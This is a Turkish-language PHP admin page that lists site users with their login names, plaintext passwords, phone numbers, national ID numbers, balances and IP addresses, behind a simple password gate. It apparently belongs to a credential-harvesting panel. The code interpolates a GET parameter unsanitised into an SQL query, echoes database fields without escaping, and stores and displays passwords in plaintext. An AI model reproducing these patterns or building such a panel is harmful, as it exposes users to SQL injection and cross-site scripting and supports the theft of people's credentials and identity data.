<?php
$total = intval($db->query("SELECT count(id) as num from users")->fetch_assoc()['num']);
$type = intval($_GET['type']);
$query = $db -> query("SELECT * from users where type = '$type' order by id DESC");
if(!isset($_GET['type'])){
  $db -> query("UPDATE users set status = 1 where status = 0");
}
?>
<div class="hero">
  <h1 class="text-600">Kullanıcılar</h1>
  <p class="hidden-xs m-b-0 m-t-20">Giriş yapan ve ya kayıt olan kullanıcıları buradan görebilirsiniz</p>
</div>
<?php if (!$_SESSION['admin_users_password']) { ?>
  <div class="page-wrapper">
    <div class="row">
      <div class="col-sm-4">
        <form onsubmit="logInUsers()" id="form">
          <div class="panel">
            <div class="panel-head bg-primary text-uppercase text-normal text-600">Güvenlik</div>
            <div class="panel-body">
              <div class="input-group">
                <label>Şifre Giriniz</label>
                <input type="password" name="password" value="" class="form-control">
              </div>
            </div>
            <div class="panel-footer">
              <button type="submit" class="btn btn-default btn-block">Onayla</button>
            </div>
          </div>
        </form>
      </div>
    </div>
  </div>
  <script>
  function logInUsers(){
    event.preventDefault();
    $.ajax({
      type: "POST",
      url: "request.php?q=check-users",
      data: $("#form").serialize(),
      success: (response) => {
        if (response == "success") {
          window.location.reload();
        }else{
          Swal.fire("","Şifre doğru değil","error")
        }
      }
    })
  }
  </script>
<? }else{ ?>
  <div class="page-wrapper">
    <div class="dflex align-center justify-between m-b-15">
      <div>
        <button class="btn btn-danger hidden-xs" onclick="deleteAllData('users')">Tüm kullanıcıları sil</button>
        <button class="btn btn-default" onclick="exportTable('users')">Dışa Aktar</button>
      </div>
      <div>
        <div class="pagenations">
          <ul>
            <li class="hidden-xs">Toplam veri<span class="text-500 m-l-5"><?=$total?></span></li>
          </ul>
        </div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-head bg-primary text-uppercase text-normal text-600">Yeni Kullanıcılar</div>
      <div class="simple-table simple-table-primary">
        <table>
          <thead>
            <tr>
              <th>ID</th>
              <th>Kullanıcı Adı</th>
              <th>Şifre</th>
              <th>Telefon</th>
              <th>TC Numarası</th>
              <th>Bakiye</th>
              <th>IP</th>
              <th>Tarih</th>
            </tr>
          </thead>
          <tbody>
            <?php
            $order = $db -> query("SELECT count(id) as num from users where type = '$_GET[type]'")->fetch_assoc()[num];
            while ($res = $query -> fetch_assoc()) { ?>
              <tr>
                <td><?=$order?></td>
                <td><?=$res['login']?></td>
                <td><?=$res['password']?></td>
                <td><?=$res['phone']?></td>
                <td><?=$res['passport']?></td>
                <td><?=$res['balance']?></td>
                <td class="text-medium"><?=$res['ip']?></td>
                <td class="thc">
                  <div class="thh"><?=explode(' ', $res['time'])[0]?></div>
                  <div class="ths">
                    <ul class="dflex">
                      <li><a href="javascript:;" onclick="changeBalance('<?=$res['id']?>')">Bakiye Ekle</a></li>
                      <li class="m-l-15"><a href="javascript:;" onclick="deleteData('users', <?=$res['id']?>, this)">Sil</a></li>
                    </ul>
                  </div>
                </td>
              </tr>
              <? $order--; } ?>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  <? } ?>
